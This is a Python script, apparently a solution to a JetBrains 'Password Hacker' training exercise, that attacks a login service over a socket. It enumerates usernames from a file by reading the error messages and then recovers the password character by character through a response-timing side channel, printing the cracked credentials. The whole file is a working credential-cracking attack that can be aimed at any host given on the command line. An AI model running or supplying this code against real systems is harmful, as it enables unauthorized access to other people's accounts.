import sys
import socket
import string
import itertools
import json
import time

hostname = sys.argv[1]
port = int(sys.argv[2])
address = (hostname, port)
characters = string.ascii_letters + string.digits

with open('/Users/shlomodahan/Desktop/JetBrains Projects/Password Hacker/logins.txt', 'r') as logins_file:
    logins = logins_file.readlines()
    logins = [x.strip() for x in logins]

login_dict = {"login": '', "password": ''}


with socket.socket() as my_sock:
    my_sock.connect(address)
    for login in logins:
        login_dict["login"] = login
        login_json = json.dumps(login_dict).encode()
        my_sock.send(login_json)
        response = my_sock.recv(1024).decode()
        response_json = json.loads(response)
        if response_json == {"result": "Wrong password!"}:
            correct_username = login
            break
    login_dict["login"] = correct_username
    password = ''
    while True:
        for char in characters:
            credentials = {"login": correct_username, "password": password + char}
            login_json = json.dumps(credentials).encode()
            my_sock.send(login_json)
            start = time.perf_counter()
            response = my_sock.recv(1024).decode()
            request_time = time.perf_counter() - start
            if request_time > 0.1:
                password += char
                break
            elif json.loads(response)["result"] == "Connection success!":
                print(json.dumps(credentials))
                exit()
